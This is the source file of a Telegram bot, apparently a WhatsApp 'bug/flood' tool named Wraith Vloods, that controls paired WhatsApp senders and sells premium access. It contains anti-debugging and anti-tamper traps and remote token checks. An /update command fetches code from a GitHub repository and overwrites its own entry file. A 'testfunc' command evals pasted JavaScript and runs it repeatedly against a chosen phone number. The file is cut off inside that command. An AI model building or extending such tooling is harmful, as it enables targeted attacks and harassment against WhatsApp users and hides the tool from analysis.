*const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const dns = require("dns").promises;
const { URL } = require("url");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('baileys');
//============( CONST ) =======\\
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const thumbnailUrl = "https://files.catbox.moe/7btid6.mp4";
//============( SAFE SOCK ) =======\\
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
//============( SECURITY ) =======\\
const databaseUrl = `https://raw.githubusercontent.com/xyzro22/Wraith-v1/refs/heads/main/tokens.json`
function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█░█░█▀▀▄░█▀▀▄░█▀▀▄░▀█▀░█░█
█▄█░█▄▄▀░█▄▄▀░█▄▄▀░░█░░█▀█
▀░▀░▀░▀▀░▀░▀▀░▀░▀▀░░▀░░▀░▀
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
`));
console.log(chalk.bold.yellow(`
□ Owner: Deryan
□ Version:  
□ Script: Wraith Vloods
□ Status: Connected`))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
  Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
      }    

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.red(`
⠀⠀Bypass detected!!
  Your bypass tools are very bad idiot.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);
//============( VALIDATE TOKEN ) =======\\
  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.red(`
  Your token not registed in database!!
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
  failed connect to server!!
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();
//============( FEATURE ) =======\\
const bot = new Telegraf(tokenBot);
let tokenValidated = false;

bot.use((ctx, next) => {
  if (secureMode) return;

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("🔒 Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//============( CONNECT ) =======\\
const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
█░█░█▀▀▄░█▀▀▄░█▀▀▄░▀█▀░█░█
█▄█░█▄▄▀░█▄▄▀░█▄▄▀░░█░░█▀█
▀░▀░▀░▀▀░▀░▀▀░▀░▀▀░░▀░░▀░▀
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
`));
console.log(chalk.bold.yellow(`
□ Owner: ShaenOfficial
□ Version: 10.0 
□ Script: Wraith Vloods 
□ Status: Connected`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Evox',
        }),
    };
    
    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`Sender Connected`))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();
//============( CHECK ) =======\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

//============( COMMAND FEATURE ) =======\\
bot.command("addsender", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addsender 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

      const code = await sock.requestPairingCode(phoneNumber, "Wraith Vloods");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote>PROSES PAIRING
☐ Number: ${phoneNumber}
☐ Pairing Code: ${formattedCode}
☐ Type: Not Connected</blockquote>`;

    const sentMsg = await ctx.replyWithVideo(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote>
PROSES PAIRING
☐ Number: ${lastPairingMessage.phoneNumber}
☐ Pairing Code: ${lastPairingMessage.pairingCode}
☐ Type: Connected</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgroup -12345678 30");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delggroup -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.command("iqc", checkPremium, async (ctx) => {
                const chatId = ctx.chat.id;
                const userId = ctx.from.id.toString();
                const args = ctx.message.text.split(" ");

               
                const fullText = ctx.message.text.replace(/^\/iqc\s+/i, "");
                const [input, batteryInput] = fullText.split(",").map(s => s?.trim());

                if (!input || !batteryInput) {  
                        return ctx.reply(  
                                "❌ Incorrect format.\n\nExample:\n/iqc ShaenOfficial,188",  
                                { parse_mode: "Markdown" }  
                        );  
                }  

                const battery = parseInt(batteryInput);
                if (isNaN(battery) || battery < 0 || battery > 100) {
                        return ctx.reply("❌ Battery must be a number between 0–100.", { parse_mode: "Markdown" });
                }

                const hours = Math.floor(Math.random() * 24).toString().padStart(2, '0');  
                const minutes = Math.floor(Math.random() * 60).toString().padStart(2, '0');  
                const time = `${hours}:${minutes}`;  
                  
                const carriers = ["TELKOMSEL", "INDOSAT OOREDOO", "XL AXIATA", "SMARTFREN", "IM3 (THREE)", "BY.U"];  
                const carrier = carriers[Math.floor(Math.random() * carriers.length)];  
                const signalStrength = Math.floor(Math.random() * 4) + 1;  

                const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(input)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=${signalStrength}&emojiStyle=apple`;  

                try {  
                        await ctx.replyWithChatAction("upload_photo");  

                        const response = await axios.get(apiUrl, { responseType: "arraybuffer" });    
                        const buffer = Buffer.from(response.data, "binary");    

                        await ctx.replyWithPhoto(  
                                { source: buffer },  
                                {  
                                        caption: `-# *iPhone Quoted Generator*\n\n💬 ${input}\n🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,  
                                        parse_mode: "Markdown",  
                                        reply_markup: {  
                                                inline_keyboard: [  
                                                        [{ text: "Wraith Vloods", url: "https://t.me/Testimonideryan" }]  
                                                ]  
                                        }  
                                }  
                        );  
                } catch (err) {  
                        console.error(err.message);  
                        ctx.reply("❌ Terjadi kesalahan saat memproses gambar.");  
                }
});

const fsp = fs.promises;

// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "makloampas";
const DEFAULT_REPO = UPD.github_repo_default || "Pullupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfiles", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("delfiles", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const OWNER_ID = [5676452821];

bot.command('testfunc', async (ctx) => {
    const isOwner = OWNER_ID.includes(ctx.from.id);
    if (!isOwner) return ctx.reply('[ #!. ] Only for owners');

    if (!ctx.message.reply_to_message)
        return ctx.reply(
            `[ $ ] Please reply to a message containing a *JavaScript function*\n\nExample:\nreply -> async function test(bot, target, ctx){...}\n/testfunc 628xxxx,1`,
            { parse_mode: 'Markdown' }
        );

    const q = ctx.message.text.split(' ').slice(1).join(' ');
    if (!q)
        return ctx.reply(
            `⁉️ Missing format.\n\nExample:\n/testfunc 628xxxx,5`
        );

    let [rawTarget, rawLoop] = q.split(',');
    const number = (rawTarget || '').replace(/[^0-9]/g, '');

    if (!number) return ctx.reply('[ $ ] Invalid target number');

    const loop = Number(rawLoop) || 1;
    const target = number;

    const funcCode =
        ctx.message.reply_to_message.text ||
        ctx.message.reply_to_message.caption ||
        '';

    if (!funcCode.includes('function'))
        return ctx.reply('[ $ ] Replied message is not a function');

    let fn;
    try {
        fn = eval(`(${funcCode})`);
    } catch (e) {
